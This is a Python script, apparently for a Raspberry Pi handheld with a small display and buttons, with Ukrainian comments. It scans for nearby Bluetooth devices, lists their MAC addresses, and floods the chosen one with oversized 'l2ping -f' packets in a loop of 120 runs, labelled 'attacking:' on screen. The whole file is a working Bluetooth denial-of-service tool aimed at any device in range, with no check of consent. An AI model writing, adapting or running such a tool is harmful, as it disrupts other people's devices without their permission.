from PIL import Image, ImageDraw, ImageFont
import time
import RPi.GPIO as GPIO
import subprocess
import signal
import os
import bluetooth




def scan_bluetooth_devices():
    nearby_devices = bluetooth.discover_devices(duration=8, flush_cache=True)
    mac_addresses = []  
    if len(nearby_devices) == 0:
        print("Не знайдено пристроїв.")

    if len(nearby_devices) > 0:
        print(f"Знайдено {len(nearby_devices)} пристроїв:")
        for addr in nearby_devices:
            mac_addresses.append(addr)

    return mac_addresses
def bluetooth_menu(disp, original_img, BUTTON_UP, BUTTON_DOWN, BUTTON_SELECT):
    img = original_img.copy()
    draw = ImageDraw.Draw(img)
    font = ImageFont.load_default()

    mac_addresses = scan_bluetooth_devices()
    cursor = 0
    while True:
        #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
        if len(mac_addresses) == 0:
            img = original_img.copy()
            draw = ImageDraw.Draw(img)
            draw.text((15, 20), "No devices found", font=font, fill="white")
            disp.display(img)
            time.sleep(2)
            break
        else:
            img = original_img.copy()
            draw = ImageDraw.Draw(img)
            y = 20
            for i, addr in enumerate(mac_addresses):
                if i == cursor:
                    draw.text((5, y), f"> {addr}", font=font, fill="white")
                else:
                    draw.text((5, y), f"  {addr}", font=font, fill="white")
                y += 20
            disp.display(img)
            button_state_UP = GPIO.input(BUTTON_UP)
            button_state_DOWN = GPIO.input(BUTTON_DOWN)
            button_state_SELECT = GPIO.input(BUTTON_SELECT)
            if button_state_UP == GPIO.LOW:
                cursor = (cursor - 1) % len(mac_addresses)
                time.sleep(0.1)
            if button_state_DOWN == GPIO.LOW:
                cursor = (cursor + 1) % len(mac_addresses)
                time.sleep(0.1)

            if button_state_SELECT == GPIO.LOW:
                selected_mac = mac_addresses[cursor]
                
                
                command = ["timeout", "1", "sudo", "l2ping", "-s", "600", "-f", selected_mac]
                print(f"l2ping {selected_mac}")               
                # Вивести статус на екран
                #draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
                img = original_img.copy()
                draw = ImageDraw.Draw(img)
                
                for i in range(120):
                    subprocess.run(command)
                    #draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
                    img = original_img.copy()
                    draw = ImageDraw.Draw(img)
                    draw.text((40, 10), f"attacking:", fill="white")
                    draw.text((5, 20), f"{selected_mac}", fill="white")
                    draw.text((40, 30), f"at {i+1}", fill="white")
                    disp.display(img)

                time.sleep(1)
                break